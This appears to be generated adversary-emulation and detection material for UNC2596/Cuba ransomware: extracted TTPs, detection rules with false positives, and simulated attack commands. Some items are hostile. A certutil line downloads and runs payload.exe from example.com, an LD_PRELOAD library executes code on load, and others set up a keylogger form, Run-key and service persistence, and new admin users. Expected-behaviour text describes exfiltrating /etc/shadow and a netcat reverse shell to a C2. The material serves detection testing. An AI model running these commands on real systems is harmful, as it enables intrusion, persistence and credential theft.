extracted_ttps.description: A dropper written in PowerShell loads BUGHATCH in-memory or a PowerShell script loads it from a remote URL
Attacker used PowerShell to execute commands for reconnaissance and enumeration of Active Directory using the Get-ADComputer cmdlet
COLDDRAW ransomware encrypts files on the local filesystem and attached network drives using an embedded RSA key
Attacker encrypted files and demanded decryption in exchange for not releasing the data, using Cuba Ransomware
UNC2596 uses PowerShell to execute commands and scripts.
The actor brings their own copy of the vulnerable Avast driver and installs it as a service, potentially leveraging signed binaries for malicious purposes
A batch script launcher creates and starts a kernel service, loading a binary file, potentially indicating user execution of malicious scripts
UNC2596 uses valid accounts to gain initial access to the victim network.
UNC2596 used PowerShell for execution
BURNTCIGAR terminates processes using the DeviceIoControl function to exploit an Avast driver's undocumented IOCTL code
UNC2596 used process injection to evade detection
UNC2596 exploited public-facing applications to gain initial access
UNC2596 used code signing certificates for resource development
UNC2596 used obfuscated files or information to evade detection
Detected PowerShell activity via NLP pattern matching
UNC2596 uses BURNTCIGAR to terminate endpoint security software.
UNC2596 uses COLDDRAW ransomware to encrypt victim data.
UNC2596 used application window discovery to gather information
UNC2596 used account manipulation to maintain persistence
UNC2596 used web protocols for command and control
UNC2596 used Remote Desktop Protocol for lateral movement
UNC2596 exploits Microsoft Exchange vulnerabilities, including ProxyShell and ProxyLogon, as an initial infection vector.
UNC2596 created accounts to maintain persistence
UNC2596 used scheduled tasks for execution
UNC2596 used shared modules for execution
Attacker used remote services, possibly for lateral movement and deployment of Cuba Ransomware
UNC2596 encrypted data for impact
UNC2596 used virtual private servers for resource development
UNC2596 uses RDP and SMB to move laterally within the victim network.
UNC2596 used keylogging to collect sensitive information
UNC2596 used Windows services to maintain persistence
UNC2596 used digital certificates for resource development
UNC2596 installed digital certificates for resource development
Detected Process Injection activity via NLP pattern matching
Detected Application Layer Protocol activity via NLP pattern matching
Attacker used WEDGECUT to scan for online hosts using ICMP packets
Attacker may have used phishing or other social engineering tactics to gain initial access, although not directly stated
UNC2596 obtained credentials from web browsers
UNC2596 used service execution for execution
UNC2596 uploaded malware for resource development
UNC2596 uploaded tools for resource development
UNC2596 linked targets for resource development
Detected Command and Scripting Interpreter activity via NLP pattern matching
Detected Obfuscated Files or Information activity via NLP pattern matching
UNC2596 uses credential theft tools such as Mimikatz to dump OS credentials.
Detected Exploit Public-Facing Application activity via NLP pattern matching
UNC2596 deploys webshells to establish a foothold in the victim network.
No explicit phishing technique is mentioned, but the report implies initial access through exploitation of vulnerabilities
Detected Scheduled Task/Job activity via NLP pattern matching
Detected Account Discovery activity via NLP pattern matching
Detected Remote Desktop Protocol activity via NLP pattern matching
UNC2596 uses WEDGECUT to scan for active network hosts.
Detected Create or Modify System Process activity via NLP pattern matching
Detected Exfiltration Over C2 Channel activity via NLP pattern matching
Detected OS Credential Dumping activity via NLP pattern matching
Detected Network Service Discovery activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching
Detected Remote Services activity via NLP pattern matching
Detected Registry Run Keys activity via NLP pattern matching
Detected Phishing activity via NLP pattern matching

rules.title: Detection: PowerShell
rules.description: A dropper written in PowerShell loads BUGHATCH in-memory or a PowerShell script loads it from a remote URL

siem_verification.message: Verification complete

rules.title: Detection: Data Encrypted for Impact
rules.description: COLDDRAW ransomware encrypts files on the local filesystem and attached network drives using an embedded RSA key

siem_verification.message: Verification complete

rules.title: Detection of Signed Binary Proxy Execution via Avast Driver
rules.description: Identifies the potential misuse of the Avast driver for malicious purposes, leveraging signed binaries for defense evasion.

siem_verification.message: Verification complete

rules.title: User Execution of Malicious Batch Script Loading Kernel Service
rules.description: Detects execution of the batch script 'aswSP_ArPot2' or creation of a service loading 'aswArPot.sys', indicating possible user execution of malicious code that installs a kernel driver.
falsepositives: Legitimate use of sc.exe by administrators to create or update services with .sys files located in temporary directories.
Running legitimate batch scripts named 'aswSP_ArPot2' for testing or internal tooling.
System maintenance tasks that invoke cmd.exe with scripts containing the word 'aswSP_ArPot2' as part of documentation.

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Valid Accounts Detection
rules.description: Detects the use of valid accounts to gain initial access to the victim network

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Terminate Process via DeviceIoControl
rules.description: Detects the termination of processes using the DeviceIoControl function to exploit an Avast driver's undocumented IOCTL code
falsepositives: Trusted processes using DeviceIoControl with the IOCTL code

siem_verification.message: Verification complete

rules.title: Process Injection Detection
rules.description: Detects process injection techniques used by UNC2596 to evade detection
falsepositives: Legitimate system administration tools using process injection for debugging purposes
Software installers or updaters using process injection for installation or update purposes

siem_verification.message: Verification complete

rules.title: Suspicious Scripting Interpreter Spawned by Web Server Process
rules.description: Detects execution of PowerShell, cmd.exe, or cscript.exe launched by known web server processes, which may indicate exploitation of a public‑facing application (zero‑day or n‑day vulnerability).
falsepositives: Legitimate administrative scripts that use PowerShell or cmd.exe launched by web server processes for maintenance.
Automated deployment pipelines or CI/CD jobs that execute scripts via the web server.
Web application debugging sessions that invoke command shells.

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detection: Code Signing Certificates
rules.description: UNC2596 used code signing certificates for resource development

siem_verification.message: Verification complete

rules.title: Obfuscated Files or Information – Encoded Command Execution
rules.description: Detects execution of processes with command‑line arguments that indicate usage of encoded or obfuscated payloads, such as PowerShell -enc, certutil decoding, or script hosts with JScript execution flags.

detection.condition: selection_powershell or selection_cmd or selection_wscript or selection_rundll

falsepositives: Legitimate administrative scripts using PowerShell -EncodedCommand for deployment
System administrators using certutil to decode files
Automation tasks that run cscript/wscript with JScript
Software installers invoking rundll32 with legitimate DLLs

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious PowerShell Execution with Encoded Commands or Script Host Parents
rules.description: Detects execution of PowerShell with encoded command flags or launched from common script host processes, indicating potential malicious activity.

detection.condition: (selection1 and (selection2 or selection3 or selection4)) or (selection1 and (selection5 or selection6 or selection7))

falsepositives: Legitimate administrative scripts using PowerShell with encoded commands
System management tools that invoke PowerShell from cmd.exe or script hosts
Scheduled tasks or automation platforms that run PowerShell with -EncodedCommand for deployment

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Application Window Discovery via Process Creation
rules.description: Detects processes that enumerate application windows, such as PowerShell, cmd, or rundll32 invoking window enumeration APIs, indicative of ATT&CK technique T1010.
falsepositives: PowerShell scripts that use -WindowStyle or UI automation cmdlets
Batch or cmd scripts that query window titles for legitimate monitoring
Rundll32 calls for legitimate UI automation or accessibility tools

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Install Digital Certificate via Command Line Tools
rules.description: Detects execution of tools commonly used to install or import digital certificates, such as certutil, certreq, PowerShell Import-Certificate, or MMC certificate manager, which may indicate resource development activity.

detection.condition: selection_certutil or selection_powershell or selection_certreq or selection_mmc

falsepositives: Legitimate administrative tasks that install or update certificates using certutil, certreq, PowerShell scripts, or MMC.
Software installers or deployment scripts that add trusted root certificates.
System maintenance or troubleshooting activities that involve certificate management.

attacks.description: Basic PowerShell command execution
attacks.expected_behavior: Executes a simple PowerShell command that prints 'Hello World'

attacks.description: Intermediate PowerShell command to download a file
attacks.expected_behavior: Downloads a file from a specified URL and saves it to the temp directory

attacks.description: Advanced PowerShell command to start a new process
attacks.expected_behavior: Starts a new cmd.exe process that prints 'Hello World'

attacks.description: Basic execution of a PowerShell command on Linux.
attacks.expected_behavior: Executes a simple PowerShell command.

attacks.description: Intermediate execution of a PowerShell script loaded from a local file.
attacks.expected_behavior: Loads and executes a PowerShell script from a local file.

attacks.description: Advanced execution with error handling and proper quoting.
attacks.expected_behavior: Demonstrates advanced quoting and error handling in PowerShell execution.

attacks.description: Create a test file in the temp directory
attacks.expected_behavior: A test file named testfile.txt is created in the temp directory with the specified content.

attacks.description: Simulate encryption by converting the test file to Base64
attacks.expected_behavior: The content of the test file is converted to Base64 and saved as a new file named encrypted_testfile.txt in the temp directory.

attacks.description: Simulate decryption of the Base64 encoded file
attacks.expected_behavior: The Base64 encoded file is decoded back to its original content and saved as a new file named decrypted_testfile.txt in the temp directory.

attacks.description: Basic encryption of a file using openssl
attacks.expected_behavior: The file test.txt will be encrypted and saved as test.txt.enc

attacks.description: Intermediate: Encrypt all files in a user's home directory
attacks.expected_behavior: All files in the specified directory will be encrypted and have .enc appended to their names

attacks.description: Advanced: Encrypt a tar archive of a user's home directory
attacks.expected_behavior: The entire home directory will be archived, encrypted, and saved as user_backup.tar.enc

attacks.command: sc.exe create TestService binPath= "C:\\Windows\\System32\\svchost.exe -k netsvcs" type= own start= auto
attacks.description: Creates a new service named TestService using the svchost.exe binary, which is a signed Microsoft binary. This demonstrates how an attacker might leverage a legitimate signed binary for malicious purposes.
attacks.expected_behavior: A new service named TestService will be created and configured to start automatically. This service will execute the svchost.exe binary with the specified parameters.

attacks.description: This command achieves the same result as the first but uses PowerShell's New-Service cmdlet. It demonstrates an alternative method for creating a service that could be used for signed binary proxy execution.
attacks.expected_behavior: Similar to the first command, but this uses PowerShell to create the service. The service will be named TestService2 and will also execute svchost.exe with the specified parameters.

attacks.description: This command starts the TestService service created by the previous commands. It's essential for demonstrating the execution aspect of the signed binary proxy execution technique.
attacks.expected_behavior: The TestService service will be started, executing the svchost.exe binary with the specified parameters. This demonstrates the successful execution of a signed binary for potentially malicious purposes.

attacks.description: Copy a malicious binary to a system location, set execute permissions, and execute it using sudo
attacks.expected_behavior: The malicious binary will be executed with elevated privileges, potentially allowing the attacker to gain control of the system

attacks.description: Download a malicious script from a remote location and execute it using sudo
attacks.expected_behavior: The malicious script will be executed with elevated privileges, potentially allowing the attacker to gain control of the system

attacks.description: Copy a legitimate binary to a system location, set execute permissions, and execute it with a malicious option using sudo
attacks.expected_behavior: The legitimate binary will be executed with elevated privileges, potentially allowing the attacker to exploit a vulnerability or misuse the binary's functionality

attacks.description: Basic user execution of an inline script using sh -c
attacks.expected_behavior: Executes an inline script that prints a test message and sleeps for 2 seconds. Simulates direct user execution of a command chain.

attacks.description: Intermediate: Creates a hidden script in user cache, makes it executable, and runs it
attacks.expected_behavior: Creates a script in the user's cache directory, sets execute permissions, and runs it. The script writes a benign message to a file in /tmp. Demonstrates script creation and execution from a user-writable location.

attacks.description: Basic attempt to access a target system using a valid user account via SSH.
attacks.expected_behavior: Successful login to the target system if the credentials are correct.

attacks.description: Intermediate command to switch to a different valid user account on the system, simulating privilege escalation within the system using 'sudo'.
attacks.expected_behavior: Switch to the target user's shell, allowing execution of commands as that user.

attacks.command: ssh -t user@target_ip 'sudo bash -c "echo "Added by valid user" >> /etc/motd"'
attacks.description: Advanced command demonstrating the use of a valid account to gain initial access and then execute a command with elevated privileges on a remote system.
attacks.expected_behavior: Appends 'Added by valid user' to the /etc/motd file on the target system, demonstrating the ability to modify system files using a valid account.

attacks.description: Terminate the Notepad process by its image name
attacks.expected_behavior: Notepad application window will close if it is running

attacks.description: Forcefully terminate a process by its ID (replace 1234 with the actual process ID)
attacks.expected_behavior: The process with the specified ID will be terminated, potentially resulting in data loss if it was performing critical tasks

attacks.description: Forcefully terminate all Chrome processes, including child processes
attacks.expected_behavior: All Google Chrome application windows will close, including any open tabs or background processes

attacks.description: Basic example of terminating a process with ID 1234 using the kill command with signal 9 (SIGKILL), which forces the process to exit immediately.
attacks.expected_behavior: Process 1234 will be terminated immediately.

attacks.description: Intermediate example using pkill to terminate a process by name. This command looks for processes matching 'example_process' and terminates them.
attacks.expected_behavior: All processes with 'example_process' in their command line will be terminated.

attacks.description: Advanced example using killall to terminate all processes with the name 'example_process' using signal 9. This ensures that all matching processes are forcefully terminated.
attacks.expected_behavior: All 'example_process' processes will be forcefully terminated.

attacks.description: Basic process injection simulation using rundll32 to execute a DLL.
attacks.expected_behavior: The command will execute the MessageBeep function from user32.dll, simulating process injection without actual malicious activity.

attacks.description: Intermediate process injection using PowerShell to create a new process and inject a command.
attacks.expected_behavior: The command will start notepad and execute a command that writes 'Hello' to a file named test.txt, demonstrating process injection capabilities.

attacks.command: wmic process call create "cmd /c echo Test > %TEMP%\test.txt"
attacks.description: Advanced process injection using wmic to create a new process and inject a command.
attacks.expected_behavior: The command will use wmic to create a new process that executes a command writing 'Test' to a file named test.txt in the temp directory, showcasing advanced process injection.

attacks.description: Attach to process 1234, inject malicious.so, and detach
attacks.expected_behavior: The malicious.so library will be loaded into the process's address space, allowing the attacker to execute arbitrary code within the process.

attacks.description: Load malicious.so into the current process's address space
attacks.expected_behavior: The malicious.so library will be loaded into the current process's address space, allowing the attacker to execute arbitrary code within the process.

attacks.description: Attach to process 1234, inject malicious.so, execute a shell, and detach
attacks.expected_behavior: The malicious.so library will be loaded into the process's address space, and a shell will be executed within the process, allowing the attacker to execute arbitrary commands.

attacks.description: Exploiting a public-facing application by downloading and executing a malicious file using certutil.
attacks.expected_behavior: Downloads a file from a specified URL and executes it, simulating the exploitation of a public-facing application.

attacks.description: Using PowerShell to download and execute an exploit from a public-facing application, demonstrating initial access.
attacks.expected_behavior: Downloads an exploit from a specified URL and executes it, showcasing how an attacker might gain initial access through a public-facing application.

attacks.command: cmd.exe /c "mkdir %TEMP%\exploitfolder -ErrorAction SilentlyContinue && cd %TEMP%\exploitfolder && certutil -urlcache -f http://example.com/payload.exe payload.exe && payload.exe"
attacks.description: Creating a directory, downloading a malicious payload into it, and executing the payload, all within the command line, to simulate exploiting a public-facing application.
attacks.expected_behavior: Creates a temporary directory, downloads a malicious file into it, and then executes the file, demonstrating a more complex scenario of exploiting a public-facing application.

attacks.description: Simulate downloading an exploit for a public-facing application vulnerability.
attacks.expected_behavior: Downloads a file to /tmp/exploit.txt without executing it, simulating the initial step of exploiting a public-facing application.

attacks.description: Attempt to download and execute a script from a potentially vulnerable public-facing application, simulating an exploit. Note: This command is for demonstration and will not actually execute anything due to writing to /dev/null.
attacks.expected_behavior: Simulates the download of an exploit script but does not actually execute it due to the use of /dev/null, demonstrating a failed exploitation attempt.

attacks.description: Create a file simulating an exploit payload for a public-facing application and then read it, demonstrating how an attacker might handle payload files.
attacks.expected_behavior: Creates a text file in /tmp and then reads its contents, simulating the handling of an exploit payload without any actual exploitation.

attacks.command: makecert -r -pe -n "CN=Test Code Signing Cert" -ss TestCertStore -sr LocalMachine -sv TestCert.pvk TestCert.cer
attacks.description: Create a self-signed code signing certificate using the makecert tool.
attacks.expected_behavior: A self-signed code signing certificate will be created in the LocalMachine certificate store.

attacks.command: powershell -Command "New-SelfSignedCertificate -CertStoreLocation 'Cert:\\LocalMachine\\My' -Subject 'CN=Test Code Signing Cert' -KeyUsage DigitalSignature -FriendlyName 'Test Code Signing Cert'"
attacks.description: Create a self-signed code signing certificate using PowerShell.
attacks.expected_behavior: A self-signed code signing certificate will be created in the LocalMachine certificate store.

attacks.description: Add the self-signed code signing certificate to the Trusted Root Certification Authorities store.
attacks.expected_behavior: The self-signed code signing certificate will be added to the Trusted Root Certification Authorities store.

attacks.description: Generate a self-signed certificate using OpenSSL
attacks.expected_behavior: A self-signed certificate and private key will be generated in the current directory.

attacks.description: View the details of a certificate
attacks.expected_behavior: The command will display the certificate's details, including the issuer, validity period, and subject.

attacks.description: Sign and verify a binary using a certificate (note: codesign is not native to Linux, this example assumes a custom or third-party implementation)
attacks.expected_behavior: The binary will be signed with the specified certificate, and its signature will be verified. This command requires admin privileges and poses a higher safety risk due to the potential for misuse in signing malicious binaries.

attacks.description: Encode a file using certutil to obfuscate its contents
attacks.expected_behavior: The file test.txt will be encoded and saved as encoded.txt in the temp directory

attacks.description: Create an archive to obfuscate a file using PowerShell
attacks.expected_behavior: The file test.txt will be archived and saved as archive.zip in the temp directory

attacks.description: Create a file, encode it, and then delete the original file to demonstrate obfuscation and evasion
attacks.expected_behavior: A file test.txt will be created, encoded, and saved as encoded.txt, then the original file will be deleted

attacks.command: echo 'This is a hidden message' > /tmp/hidden.txt; gzip /tmp/hidden.txt
attacks.description: Creates a text file with a hidden message, then compresses it using gzip to obscure its contents.
attacks.expected_behavior: A compressed file named hidden.txt.gz will be created in /tmp, containing the obscured message.

attacks.description: Obfuscates the contents of /etc/passwd by encoding it with base64 and saves it to a new file.
attacks.expected_behavior: A file named obfuscated_passwd.txt will be created in /tmp, containing the base64 encoded version of /etc/passwd.

attacks.description: Encrypts the contents of /etc/hosts using AES-256-CBC and saves it to a new file, requiring a password for decryption.
attacks.expected_behavior: A file named encrypted_hosts.txt will be created in /tmp, containing the encrypted version of /etc/hosts. Decryption will require the password entered during encryption.

attacks.description: This command uses PowerShell to get a list of running processes on the system.
attacks.expected_behavior: The command will execute and display a list of running processes.

attacks.description: This command uses PowerShell to create a file in the temporary directory with a test string.
attacks.expected_behavior: The command will execute and create a file named test.txt in the temporary directory.

attacks.description: This command uses PowerShell to download a webpage and save it to the temporary directory.
attacks.expected_behavior: The command will execute and download the webpage, saving it to the temporary directory.

attacks.description: List all running applications
attacks.expected_behavior: Displays a list of all running applications

attacks.description: Get the title of the explorer.exe window
attacks.expected_behavior: Displays the title of the explorer.exe window

attacks.description: Get the title of all windows
attacks.expected_behavior: Displays the title of all windows

attacks.description: Display information about the root window, which can include details about the screen and available windows.
attacks.expected_behavior: The command will output detailed information about the root window, including its dimensions, position, and possibly a list of child windows.

attacks.description: Search for windows with the class 'firefox' and print their window IDs.
attacks.expected_behavior: The command will output the window IDs of all windows belonging to the 'firefox' class, allowing for further interaction or information gathering.

attacks.description: Get the ID of the currently focused window and then retrieve its title.
attacks.expected_behavior: The command will output the title of the window that is currently in focus, demonstrating how to interact with and gather information about specific application windows.

attacks.description: Add a new user with the username 'testuser' and password 'testpassword'
attacks.expected_behavior: A new user 'testuser' is added to the system

attacks.description: Change the password of the user 'testuser' to 'newpassword'
attacks.expected_behavior: The password of 'testuser' is changed to 'newpassword'

attacks.description: Add the user 'testuser' to the administrators group
attacks.expected_behavior: The user 'testuser' is added to the administrators group, granting elevated privileges

attacks.description: Create a new user named testuser with a home directory and default shell.
attacks.expected_behavior: A new user account is created with the specified properties.

attacks.description: Add the testuser user to the sudo group, granting them sudo privileges.
attacks.expected_behavior: The testuser is added to the sudo group, allowing them to use sudo for commands.

attacks.description: Change the password of the testuser to 'newpassword'.
attacks.expected_behavior: The password of testuser is changed to 'newpassword'.

attacks.command: cmd.exe /c "echo GET /benign HTTP/1.1 > %TEMP%\request.txt & echo Host: example.com >> %TEMP%\request.txt & certutil -urlcache -f -w http://example.com %TEMP%\response.txt"
attacks.description: Sends a basic HTTP request to a server using certutil and cmd, demonstrating manual command and control communication over web protocols.
attacks.expected_behavior: Sends an HTTP request and saves the response to a file in the temp directory.

attacks.command: schtasks /create /tn "Test Task" /tr "cmd.exe /c echo Hello World > %TEMP%\test.txt" /sc daily
attacks.description: Create a basic scheduled task that runs daily and writes to a file in the temp directory
attacks.expected_behavior: A file named test.txt will be created in the temp directory with the content 'Hello World'

attacks.command: schtasks /create /tn "Intermediate Task" /tr "cmd.exe /c echo Intermediate Task executed > %TEMP%\intermediate.txt" /sc minute /mo 30
attacks.description: Create an intermediate scheduled task that runs every 30 minutes and writes to a file in the temp directory
attacks.expected_behavior: A file named intermediate.txt will be created in the temp directory with the content 'Intermediate Task executed' every 30 minutes

attacks.command: schtasks /create /tn "Advanced Task" /tr "cmd.exe /c echo Advanced Task executed > %TEMP%\advanced.txt" /sc daily /st 08:00 /sd 2024-01-01 /ed 2024-12-31
attacks.description: Create an advanced scheduled task that runs daily at 8:00 AM from January 1, 2024, to December 31, 2024, and writes to a file in the temp directory
attacks.expected_behavior: A file named advanced.txt will be created in the temp directory with the content 'Advanced Task executed' every day at 8:00 AM from January 1, 2024, to December 31, 2024

attacks.description: Open cron table for editing to add a new scheduled task
attacks.expected_behavior: Opens the cron table in the default editor, allowing the user to add a new line for a scheduled task.

attacks.description: Schedule a one-time task to run a script in 1 minute
attacks.expected_behavior: Schedules the script.sh to run once in 1 minute from the current time.

attacks.description: Add a new cron job for an advanced script to run daily at midnight
attacks.expected_behavior: Appends a new line to the cron table that runs advanced_script.sh daily at midnight, potentially requiring admin privileges depending on the script's actions.

attacks.description: Register a DLL as a shared module using regsvr32
attacks.expected_behavior: The DLL is registered silently without prompts

attacks.description: Load a shared module in PowerShell
attacks.expected_behavior: The module is loaded into the current PowerShell session

attacks.description: Execute a function from a shared module using rundll32
attacks.expected_behavior: The specified function from the DLL is executed

attacks.description: Basic example using LD_PRELOAD to load a shared module before executing ls command
attacks.expected_behavior: The shared module will be loaded and potentially execute malicious code before the ls command is executed.

attacks.description: Intermediate example compiling a shared module from source before loading and executing it with ls command
attacks.expected_behavior: The shared module will be compiled, loaded, and potentially execute malicious code before the ls command is executed.

attacks.command: echo 'void __attribute__((constructor)) init() { system("/bin/ls"); }' > malicious.c; gcc -shared -o malicious.so -fPIC malicious.c; export LD_PRELOAD=./malicious.so; /bin/ls
attacks.description: Advanced example creating a shared module that executes system commands upon loading, then loading and executing it with ls command
attacks.expected_behavior: The shared module will be created, loaded, and execute the system command before the ls command is executed, demonstrating a more complex payload execution.

attacks.description: Lists all running services, which can be used for reconnaissance in lateral movement.

attacks.description: Advanced command using SSH to execute a remote command that writes to a file, demonstrating command execution and file creation capabilities.
attacks.expected_behavior: Creates a new file on the remote host with specified content, showing remote command execution.

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $o = New-Object System.Windows.Forms.Form; $t = New-Object System.Windows.Forms.TextBox; $t.Multiline = $true; $t.ScrollBars = 'Both'; $o.Controls.Add($t); $o.Text = 'Keylogger'; $o.Size = New-Object System.Drawing.Size(300, 300); $o.ShowDialog() | Out-Null; $t.Text | Out-File -FilePath '%TEMP%\keylog.txt'"
attacks.description: Simulates a basic keylogger by creating a form with a text box and saving input to a file.
attacks.expected_behavior: A form will appear, and any text typed into it will be saved to a file named 'keylog.txt' in the temp directory.

attacks.description: A basic command to test file write operations, potentially precursor to more complex keylogging setups.
attacks.expected_behavior: A file named 'test.txt' will be created in the temp directory with the content 'Hello World!'.

attacks.description: Start a Linux service named myservice to demonstrate persistence
attacks.expected_behavior: The service myservice will be started, demonstrating how a malicious service could be used for persistence.

attacks.description: Enable a Linux service named myservice to start at boot, enhancing persistence
attacks.expected_behavior: The service myservice will be enabled to start at boot, showing how persistence can be maintained across reboots.

attacks.command: sudo bash -c 'echo "[Service]" >> /etc/systemd/system/myservice.service; echo "ExecStart=/bin/sleep 100" >> /etc/systemd/system/myservice.service; systemctl daemon-reload; systemctl start myservice'
attacks.description: Create and start a simple Linux service that sleeps, demonstrating basic persistence technique
attacks.expected_behavior: A new service named myservice will be created and started, running the command /bin/sleep 100, illustrating how a simple service can be used for persistence purposes.

attacks.expected_behavior: The encoded /etc/shadow file will be sent to the C2 server at 192.168.1.100:8080

attacks.description: Establish reverse shell with C2 server and exfiltrate data using netcat
attacks.expected_behavior: A reverse shell will be established with the C2 server at 192.168.1.100:8080, allowing for data exfiltration and command execution

attacks.description: This command demonstrates archiving a collected data file using PowerShell's Compress-Archive cmdlet.
attacks.expected_behavior: Creates a zip archive of a test file in the temp directory.

attacks.description: This command collects files from the temp directory that have been modified in the last day and archives them.
attacks.expected_behavior: Archives recently modified files in the temp directory.

attacks.description: This command attempts to collect files from the root of the C drive and archive them, handling potential errors.
attacks.expected_behavior: Tries to archive files from the C drive root, may require admin privileges and could pose a risk if not properly controlled.

attacks.description: Basic archiving of data using tar with gzip compression
attacks.expected_behavior: Creates a compressed archive named archive.tar.gz in the current directory containing the data from /path/to/data

attacks.description: Intermediate example that archives data and then moves the archive to the current directory
attacks.expected_behavior: Creates a compressed archive in /tmp and then moves it to the current directory

attacks.description: Advanced example using find to select files and tar to archive, handling file names with spaces or special characters
attacks.expected_behavior: Creates a compressed archive named archive.tar.gz containing files from /path/to/data, safely handling file names

attacks.command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v test /t REG_SZ /d "cmd.exe /c echo test > %TEMP%\test.txt" /f
attacks.description: Basic: Add a Registry Run key to execute a command upon user login
attacks.expected_behavior: The command will execute upon user login and create a test file in the temp directory

attacks.command: reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v test /t REG_SZ /d "cmd.exe /c echo test > %TEMP%\test.txt" /f
attacks.description: Intermediate: Add a Registry Run key to execute a command upon system startup (requires admin)
attacks.expected_behavior: The command will execute upon system startup and create a test file in the temp directory

attacks.description: Advanced: Use PowerShell to add a Registry Run key (alternative method)
attacks.expected_behavior: The command will execute upon user login and create a test file in the temp directory

attacks.description: Opens the cron table for editing in the default editor, allowing for the addition of persistence mechanisms.
attacks.expected_behavior: The command opens the cron table for editing, enabling the addition of new cron jobs for persistence.

attacks.description: Enables and starts a systemd service named 'myservice' for persistence, requiring admin privileges.
attacks.expected_behavior: The specified service is enabled to start at boot and started immediately, demonstrating persistence.

attacks.description: Appends a cron job to run a script at reboot, simulating persistence without directly editing the crontab.
attacks.expected_behavior: A new cron job is added to execute the specified script at system reboot, achieving persistence.
